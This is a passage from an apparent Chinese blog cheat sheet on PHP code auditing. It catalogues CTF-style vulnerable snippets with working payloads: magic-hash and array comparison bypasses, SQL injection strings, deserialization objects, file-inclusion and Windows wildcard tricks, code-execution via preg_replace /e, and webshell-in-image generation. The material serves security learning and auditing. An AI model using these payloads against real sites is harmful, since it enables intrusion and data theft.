//0e462097431906509019562988736854\nmd5('QNKCDZO') //0e830400451993494058024219903391\n0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。\nmd5('240610708')==md5('QNKCDZO'); //True\nmd5('240610708')===md5('QNKCDZO'); //False\n\n这样的对应数值还有：\nvar_dump(md5('240610708') == md5('QNKCDZO'));\nvar_dump(md5('aabg7XSs') == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\nvar_dump('0010e2' == '1e3');\nvar_dump('0x1234Ab' == '1193131');\nvar_dump('0xABCdef' == ' 0xABCdef');\n```\n技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串\n\n```php\n#方法1\n#s1=QNKCDZO&s2=240610708\n#方法2\n#?s1[]=1&s2[]=2\n#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null\n#则可以使：[1] !== [2] && md5([1]) ===md5([2])\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif ($_GET['s1'] != $_GET['s2']\n&& md5($_GET['s1']) == md5($_GET['s2'])) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n```php\n##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null\n$name = addslashes($_POST['name']);\n$r = $db->get_row(\"SELECT `pass` FROM `user` WHERE `name`='{$name}'\");\nif ($r['pass'] === md5($_POST['pass'])) {\necho \"success\";\n}\n```\n\n### json传数据{\"key\":0}\nPHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。\n```\napplication/x-www-form-urlencoded\nmultipart/form-data\napplication/json\napplication/xml\n```\n第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.\n\n{\"key\":\"0\"}\n\n这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：\n\n{\"key\":0}\n\n### strcmp漏洞1：返回0\n适用与5.3之前版本的php\n\n`int strcmp ( string $str1 , string $str2 )`\n// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。\n当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。\n\n```php\n##flag[]=admin\ndefine('FLAG', 'pwnhub{THIS_IS_FLAG}');\nif (strcmp($_GET['flag'], FLAG) == 0) {\necho \"success, flag:\" . FLAG;\n}\n```\n\n### strcmp漏洞2：返回Null\n修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。\narray和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。\n`strcmp($c[1],$d) `\n\n\n### strcmp漏洞3: 判断使用的是 ==\n\n而判断使用的是==，当NULL==0是 bool(true)\n\n### in_array，array_search 弱类型比较\n\n松散比较下，任何string都等于true：\n\n```php\n// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'\n// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'\n// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.\nif(is_array(@$a[\"a2\"])){\n        if(count($a[\"a2\"])!==5 OR !is_array($a[\"a2\"][0])) die(\"nope\");\n        $pos = array_search(\"ctf\", $a[\"a2\"]);\n        $pos===false?die(\"nope\"):NULL;\n        foreach($a[\"a2\"] as $key=>$val){\n            $val===\"ctf\"?die(\"nope\"):NULL;\n        }\n        $v2=1;\n}\n```\n\n### sha1() md5() 报错相等绕过（False === False）\nsha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false\nmd5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。\n```php\n##?name[]=1&password[]=2\n## === 两边都是false则成立\nif ($_GET['name'] == $_GET['password'])\n    echo '<p>Your password can not be your name!</p>';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\n    die('Flag: '.$flag);\n```\n\n\n### strpos数组NULL(Null !== False)\n\nstrpos()输入数组出错返回null\n\n```php\n#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.\n<?php\n$flag = \"flag\";\n    if (isset ($_GET['nctf'])) {\n        if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) # %00截断\n            echo '必须输入数字才行';\n        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   \n            die('Flag: '.$flag);\n        else\n            echo '骚年，继续努力吧啊~';\n    }\n```\n\n### 十六进制与十进制比较\n\n== 两边的十六进制与十进制比较，是可以相等的。\n\n```php\n#?password=0xdeadc0de\n#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n    $flag = 'flag{test}';\n    $one = ord('1');  //ord — 返回字符的 ASCII 码值\n    $nine = ord('9'); //ord — 返回字符的 ASCII 码值\n    $number = '3735929054';\n    // Check all the input characters!\n    for ($i = 0; $i < strlen($number); $i++)\n    { \n        // Disallow all the digits!\n        $digit = ord($temp{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许\n        {\n            // Aha, digit not allowed!\n            return \"flase\";\n        }\n    }\n    if($number == $temp) # \n        return $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n```\n\n\n## md5注入带入’or’\n原理：\n```php\nmd5(string,raw)\nraw\t可选。规定十六进制或二进制输出格式：\n    TRUE - 原始 16 字符二进制格式\n    FALSE - 默认。32 字符十六进制数\n```\n当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。\n```php\n## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入\n$sql = \"SELECT * FROM admin WHERE username = admin pass = '\".md5($password,true).\"'\";\n```\n\n## switch没有break\n```php\n#这里case 0 和 1 没有break,使得程序继续往下执行。\n<?php\nerror_reporting(0);\nif (isset($_GET['which']))\n{\n    $which = $_GET['which'];\n    switch ($which)\n    {\n    case 0:\n    case 1:\n    case 2:\n        require_once $which.'.php';\n         echo $flag;\n        break;\n    default:\n        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);\n        break;\n    }\n}\n```\n\n## 反序列化\n\n```php\n<!-- index.php -->\n<?php \n\trequire_once('shield.php');\n\t$x = new Shield();\n\tisset($_GET['class']) && $g = $_GET['class'];\n\tif (!empty($g)) {\n\t\t$x = unserialize($g);\n\t}\n\techo $x->readfile();\n?>\n<img src=\"showimg.php?img=c2hpZWxkLmpwZw==\" width=\"100%\"/>\n<!-- shield.php -->\n<?php\n\t//flag is in pctf.php\n\tclass Shield {\n\t\tpublic $file;\n\t\tfunction __construct($filename = '') {\n\t\t\t$this -> file = $filename;\n\t\t}\n\t\t\n\t\tfunction readfile() {\n\t\t\tif (!empty($this->file) && stripos($this->file,'..')===FALSE  \n\t\t\t&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n\t\t\t\treturn @file_get_contents($this->file);\n\t\t\t}\n\t\t}\n\t}\n?>\n<!-- showimg.php -->\n<?php\n\t$f = $_GET['img'];\n\tif (!empty($f)) {\n\t\t$f = base64_decode($f);\n\t\tif (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\\\')===FALSE\n\t\t//stripos — 查找字符串首次出现的位置（不区分大小写）\n\t\t&& stripos($f,'pctf')===FALSE) {\n\t\t\treadfile($f);\n\t\t} else {\n\t\t\techo \"File not found!\";\n\t\t}\n\t}\n?>\n```\n\n```php\n#?class=O:6:\"Shield\":1:{s:4:\"file\";s:8:\"pctf.php\";}\n<!-- answer.php -->\n<?php\n\nrequire_once('shield.php');\n$x = class Shield();\n$g = serialize($x);\necho $g;\n\n?>\n\n<!-- shield.php -->\n<?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = 'pctf.php') {\n            $this -> file = $filename;\n        }\n        \n        function readfile() {\n            if (!empty($this->file) && stripos($this->file,'..')===FALSE  \n            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\\\')==FALSE) {\n                return @file_get_contents($this->file);\n            }\n        }\n    }\n?>\n```\n\n## 文件包含\n\n原理：\n\ninclude()/include_once()，require()/require_once()，中的变量可控\n\n利用过程：\n```\n上传图片（含有php代码的图片） \n读文件，读php文件 \n包含日志文件getshell \n包含/proc/self/envion文件getshell \n如果有phpinfo可以包含临时文件 \n包含data://或php://input等伪协议（需要allow_url_include=On)\n```\n\n封闭协议：\n```\nfile:// — 访问本地文件系统\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n```\n\n\n```php\n## 访问共享目录\ninclude ('\\evilservershell.php');\n```\n\n\n## 提交参数无过滤\n\n原理:过滤了GPC，但没有过滤其它部分。\n\n```bash\n上传文件相关变量如$_FIle\n$_GET，$_POST，$_Cookie，$_SERVER，$_ENV，$_SESSION，$_REQUEST\nHTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响\n$_HTTP_COOKIE_VARS\n$_HTTP_ENV_VARS\n$_HTTP_GET_VARS\n$_HTTP_POST_FILES\n$_HTTP_POST_VARS\n$_HTTP_SERVER_VARS\n```\n\n案例：\n```php\nforeach($_COOKIE AS $_key=>$_value){\n\tunset($$_key);\n}\nforeach($_POST AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_POST[$_key];\n}\nforeach($_GET AS $_key=>$_value){\n\t!ereg(\"^\\_[A-Z]+\",$_key) && $$_key=$_GET[$_key];\n}\n```\n通过表单来传值。\n```html\n<form method=\"post\" action=\"http://localhost/qibo/member/comment.php?job=ifcom\" enctype=\"multipart/form-data\">\n<input type=\"file\" name=\"cidDB\">  \n<input type=\"submit\">\n</form>\n```\n这里的gid为查询参数\n```php\n$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n```\n\n## 伪造IP\n原理:\n以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。\n```php\n关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv('HTTP_CLIENT_IP');\necho $_SERVER['REMOTE_ADDR']; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER['HTTP_CLIENT_IP']; //代理端的（有可能存在，可伪造）\necho $_SERVER['HTTP_X_FORWARDED_FOR']; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n```\n\n```\n这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】\n```\n\n\n## 绕过正则匹配\n\n\n### 缺少^和$限定\n\n\n### 数组绕过正则\n\n【\\A[ _a-zA-Z0-9]+\\z】\n\n\n### str_replace路径穿越\n原理\nstr_replace的过滤方式为其search参数数组从左到右一个一个过滤。\n\n```php\n## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array('..\\\\', '../', './', '.\\\\'), '', trim($dir),$countb);\necho $dir;\necho '</br>替换数量';\necho $countb;\n```\n\n```php\n## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array('../', '\\\\', '..'), array('', '/', ''), $_GET['file'],$counta);\necho $file;\necho '</br>替换数量';\necho $counta;\n```\n\n\n## short_open_tag=on 短标签\n\n原理：\n当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；\n格式为：<?xxxx;?> --> <?xxx;\n```bash\nGo0s@ubuntu:~$ cat test.php\n<?=\"helloworld\";\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n```\n\n\n## file_put_contents第二个参数传入数组\n\n原理：\n```php\nfile_put_contents(file,data,mode,context)\nfile\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n```\n\n```php\n## ?filename=xiaowei.php&data[]=<?php&data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n<?php\n$a = $_GET['data'];\n$file = $_GET['filename'];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n```\n\n\n## 单引号和双引号\n\n原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。\n\n```php\n# 1\n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string'; \n$s = \"I am a 'single quote string' inside a double quote string\"; \n$s = 'I am a \"double quote string\" inside a single quote string';\n# 2\n$abc='I love u'; \necho $abc //结果是:I love u \necho '$abc' //结果是:$abc \necho \"$abc\" //结果是:I love u \n# 3\n$a=\"${@phpinfo()}\"; //可以解析出来\n<?php $a=\"${@phpinfo()}\";?> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n```\n\n\n### 查询语句缺少单引号\n\n```php\n\"Select * from table where id=$id\" # 有注入\n\"Select * from table where id=\".$id.\" limit 1\" # 有注入\n\"Select * from table where id='$id'\" # 无注入\n\"Select * from table where id='\".$id.\"' limit 1\" # 无注入\n```\n\n## 宽字符注入\n原理\n常见转码函数：\niconv()\nmb_convert_encoding()\naddslashes\n防御：\n用mysql_real_escape_string\n\n```php\n## ?username=tom&password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(\"SET NAMES gbk\");\n$query = \"select * from user where uname='\".$uname.\"' and pwd='\".$pwd.\"'\";\n```\n\n## 跳转无退出\n原理:\n没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。\n```php\n## 1\n$this->myclass->notice('alert(\"系统已安装过\");window.location.href=\"'.site_url().'\";');\n## 2\nheader(\"location: ../index.php\");\n```\n\n## 二次编码注入\n由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。\n如%2527，两次urldecode会最后变成'\n```\nbase64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n```\n\n## 前端可控变量填充导致XSS\n\n当html里的链接是变量时，易出现XSS。\n```html\n={#、echo、print、printf、vprintf、<%=$test%>\nimg scr={#$list.link_logo#}\n```\n\n## 命令执行函数\n\n```php\nsystem()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = \"phpinfo\"\npopen('whoami >>D: /2.txt', 'r'); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n```\n防范方法：\n使用自定义函数或函数库来替代外部命令的功能\n使用escapeshellarg 函数来处理命令参数\n使用safe_mode_exec_dir 指定可执行文件的路径\n\n### create_function\ncreate_function构造了一个return后面的语句为一个函数。\n```php\n#?sort_by=\"]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[\"\"]);}phpinfo();/*\"], $b[\"\"]);}phpinfo();/*\"]);\n#前面闭合，然后把后面的全部注释掉了。\n<?php\n$sort_by=$_GET['sort_by'];\n$sorter='strnatcasecmp';\n$databases=array('test','test');\n$sort_function = ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\nusort($databases, create_function('$a, $b', $sort_function));\n```\n\n\n\n### mb_ereg_replace()的/e模式\n原理\n```\nmb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= \"msr\"  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n```\n\n### preg_replace /e模式执行命令\n```php\n# ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(\"/\\[(.*)]/e\",'\\\\1',$_GET['str']);\n```\n\n## 动态函数执行\n```php\ncall_user_func\ncall_user_func_array\n```\n\n```php\n# ?a=assert\ncall_user_func($_GET['a'],$b);\n```\n\n\n## 代码执行\n```php\nassert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n```\n\n### eval()和assert()代码执行\n\n当assert()的参数为字符串时 可执行PHP代码。\n区别：assert可以不加;，eval不可以不加;。\n```php\neval(\" phpinfo(); \");【√】 eval(\" phpinfo() \");【X】\nassert(\" phpinfo(); \");【√】 assert(\" phpinfo() \");【√】\n```\n\n\n## 优先级绕过\n原理：\n如果运算符优先级相同，那运算符的结合方向决定了该如何运算\nhttp://php.net/manual/zh/language.operators.precedence.php\n\n优先级：&&/|| 大于 = 大于 AND/OR\n\n```php\n# ($test = true) and false; $test2 = (true && false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true && false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(\"123\") and is_numeric(\"anything false\"); var_dump($test3); //bool(true)\n```\n\n## getimagesize图片判断绕过\n原理：\n当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。\n只要我们在文件头部加入GIF89a后可以上传任意后缀文件。\n\n生成小马图的方法：\n```bash\ncat image.png webshell.php > image.php\n```\n\n```php\n## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request->getFiles();\n# 2\nif(getimagesize($files['users']['photo']['tmp_name']))\n        {\n          move_uploaded_file($files['users']['photo']['tmp_name'], $filename);\n# 3\n$filesize = @getimagesize('/path/to/image.png');\nif ($filesize) {\n    do_upload();\n}\n```\n\n## <变*，windows findfirstfile利用\n\n原理：\nWindows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。\n执行过程中，字符\">\"被替换成\"?\"，字符\"<\"被替换成\"*\"，而符号\"（双引号）被替换成一个\".\"字符。\n所以：\n1. \">\"\">>\"可代替一个字符,\"<\"可以代替后缀多个字符，\"<<\"可以代替包括文件名和后缀多个字符。所以一般使用<<\n2. \" 可以代替.\n3. 文件名第一个字符是\".\"的话，读取时可以忽略之\n\n| NO   | Status | Function             | Type of operation      |\n| ---- | ------ | -------------------- | ---------------------- |\n| 1.   | OK     | include()            | Includefile            |\n| 2.   | OK     | include_once()       | Includefile            |\n| 3.   | OK     | require()            | Includefile            |\n| 4.   | OK     | require_once()       | Include file           |\n| 5.   | OK     | fopen()              | Openfile               |\n| 6.   | OK     | ZipArchive::open()   | Archive file           |\n| 7.   | OK     | copy()               | Copyfile               |\n| 8.   | OK     | file_get_contents()  | Readfile               |\n| 9.   | OK     | parse_ini_file()     | Readfile               |\n| 10.  | OK     | readfile()           | Readfile               |\n| 11.  | OK     | file_put_contents()  | Write file             |\n| 12.  | OK     | mkdir()              | New directory creation |\n| 13.  | OK     | tempnam()            | New file creation      |\n| 14.  | OK     | touch()              | New file creation      |\n| 15.  | OK     | move_uploaded_file() | Move operation         |\n| 16.  | OK     | opendiit)            | Directory operation    |\n| 17.  | OK     | readdir()            | Directory operation    |\n| 18.  | OK     | rewinddir()          | Directory operation    |\n| 19.  | OK     | closedir()           | Directory operation    |\n| 20.  | FAIL   | rename()             | Move operation         |\n| 21.  | FAIL   | unlink()             | Delete file            |\n| 22.  | FAIL   | rmdir())             | Directory operation    |\n\n```php\n## ?file=1<\n## ?file=1>\n## ?file=1\"txt\n文件名为1.txt\n\n## ?file=1234.tx>\n## ?file=1234.<\n## ?file=1<<\n## ?file=1<<\">\n## ?file=123>\">\n## ?file=>>>4\">\n## ?file=<<4\">\n文件名为1234.txt\n\ninclude('shell<');  \ninclude('shell<<');\ninclude('shell.p>p'); \ninclude('shell\"php');\nfopen('.htacess');  //==>fopen(\"htacess');\nfile_get_contents('C:boot.ini'); //==>  file_get_contents ('C:/boot.ini');\nfile_get_contents('C:/tmp/con.jpg'); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents('C:/tmp/con.jpg',chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n```\n\n## 处理value没有处理key\n\nforeach时,addslashes对获得的value值进行处理，但没有处理key。\n\n\n## 用来目录遍历的特别函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\nlstat 函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\nstream_resolve_include_path函数\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\n\nhttp://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\n\n\n## 绕过GD库图片渲染\n\n[jpg_payload.zip](file/PHP代码审计_jpg_payload.zip)\n\njpg_name.jpg是待GD处理的图片\n```\nphp jpg_payload.php <jpg_name.jpg>\n```\n生成好的图片，在经过如下代码处理后，依然能保留其中的shell：\n\n```php\n<?php\n    imagecreatefromjpeg('xxxx.jpg');\n?>\n```\n\n## 会话固定\n\n```php\nif(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid\n```\n通过get方法来设置session。所以可以通过CSRF：\n\nhttp://xxxx/index.php?r=admin/index/index&phpsessid=f4cking123\n\n管理员点了我们就能使用此session进后台了。\n\n## end方法获取元素的问题\n\n```php\n$file = array(1 => 'png', 0 => 'php');\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n```\n\n两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。\n\n## 资料\n\nPHP代码审计分段讲解\n\nhttps://github.com/bowu678/php_bugs\n\nhttps://github.com/jiangsir404/Audit-Learning\n\n\nhttps://read.douban.com/reader/ebook/16642056/","slug":"代码审计","published":1,"updated":"2018-06-30T02:04:19.309Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12iy0023qkdlcyncg2e9","content":"<h1 id=\"PHP代码审计归纳\"><a href=\"#PHP代码审计归纳\" class=\"headerlink\" title=\"PHP代码审计归纳\"></a>PHP代码审计归纳</h1><p>Author: 木禾 ali0th</p>\n<p><a href=\"https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\" target=\"_blank\" rel=\"noopener\">https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md</a></p>\n<h2 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h2><h3 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract()\"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = <span class=\"string\">\"Original\"</span>;</span><br><span class=\"line\">$my_array = <span class=\"keyword\">array</span>(<span class=\"string\">\"a\"</span> =&gt; <span class=\"string\">\"Cat\"</span>,<span class=\"string\">\"b\"</span> =&gt; <span class=\"string\">\"Dog\"</span>, <span class=\"string\">\"c\"</span> =&gt; <span class=\"string\">\"Horse\"</span>);</span><br><span class=\"line\">extract($my_array); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"\\$a = $a; \\$b = $b; \\$c = $c\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 结果：$a = Cat; $b = Dog; $c = Horse</span></span><br></pre></td></tr></table></figure></p>\n<p>这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?shiyan=&amp;flag=1</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$flag=<span class=\"string\">'xxx'</span>; </span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($shiyan))</span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">    $content=trim(file_get_contents($flag)); <span class=\"comment\"># content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($shiyan==$content)</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'ctf&#123;xxx&#125;'</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">else</span></span><br><span class=\"line\">   &#123; </span><br><span class=\"line\">    <span class=\"keyword\">echo</span><span class=\"string\">'Oh.no'</span>;</span><br><span class=\"line\">   &#125; </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<h3 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str()\"></a>parse_str()</h3><p>解析字符串并注册成变量<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$b=<span class=\"number\">1</span>;</span><br><span class=\"line\">Parse_str(<span class=\"string\">'b=2'</span>);</span><br><span class=\"line\">Print_r($b);</span><br><span class=\"line\"><span class=\"comment\"># 结果: $b=2</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"import-request-variables\"><a href=\"#import-request-variables\" class=\"headerlink\" title=\"import_request_variables()\"></a>import_request_variables()</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。</span><br><span class=\"line\">在<span class=\"number\">5.4</span>之后被取消，只可在<span class=\"number\">4</span><span class=\"number\">-4.1</span><span class=\"number\">.0</span>和<span class=\"number\">5</span><span class=\"number\">-5.4</span><span class=\"number\">.0</span>可用。</span><br><span class=\"line\"><span class=\"comment\">//导入POST提交的变量值，前缀为post_</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"p\"</span>， <span class=\"string\">\"post_\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST</span></span><br><span class=\"line\">import_request_variable(<span class=\"string\">\"gp\"</span>， <span class=\"string\">\"gp_\"</span>);</span><br><span class=\"line\"><span 